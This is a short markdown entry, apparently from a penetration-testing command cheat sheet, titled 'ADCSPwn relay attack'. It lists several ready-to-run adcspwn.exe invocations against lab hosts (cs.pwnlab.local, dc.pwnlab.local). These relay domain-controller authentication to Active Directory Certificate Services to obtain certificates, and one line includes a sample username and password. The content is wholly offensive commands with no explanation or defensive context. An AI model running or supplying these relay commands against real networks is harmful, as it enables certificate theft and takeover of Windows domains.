---
id: 1cce9fb7-aacd-40a7-b853-8b3c2c82bd33
name: ADCSPwn relay attack
type: command
executor: bash
data: 'adcspwn.exe --adcs <cs server> --port [local port] --remote [computer]

  adcspwn.exe --adcs cs.pwnlab.local

  adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --port 9001

  adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --output C:\Temp\cert_b64.txt

  adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --username pwnlab.local\mranderson
  --password The0nly0ne! --dc dc.pwnlab.local'
output: null
created_at: '2023-04-06T03:56:05.989619+00:00'
updated_at: '2023-04-10T20:26:16.822815+00:00'
---

# ADCSPwn relay attack

```bash
adcspwn.exe --adcs <cs server> --port [local port] --remote [computer]
adcspwn.exe --adcs cs.pwnlab.local
adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --port 9001
adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --output C:\Temp\cert_b64.txt
adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --username pwnlab.local\mranderson --password The0nly0ne! --dc dc.pwnlab.local
```
